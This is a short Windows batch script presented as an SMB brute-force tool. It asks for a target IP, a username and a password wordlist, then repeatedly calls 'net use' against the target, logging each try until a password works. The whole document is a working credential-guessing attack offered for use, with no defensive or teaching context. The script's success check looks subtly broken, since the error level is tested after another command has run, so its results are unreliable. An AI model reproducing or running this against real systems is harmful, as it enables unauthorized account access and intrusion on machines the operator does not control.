@echo off
title SMB Bruteforce For Windows Local Account Passwords
color 9
echo.
set /p ip="IP Address Or Domain: "
set /p user="Enter Username: "
set /p wordlist="Path Of Txt File List Containig Passwords: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Logon Key Not Found In Specified List :( Womp Wo Suck It Up Kid...
pause
exit

:success
echo.
echo Password Potenial Logon Key Found For %user% On Domain Or IP %ip%! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [%ip%] [BruteForce Atempt Number.%count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
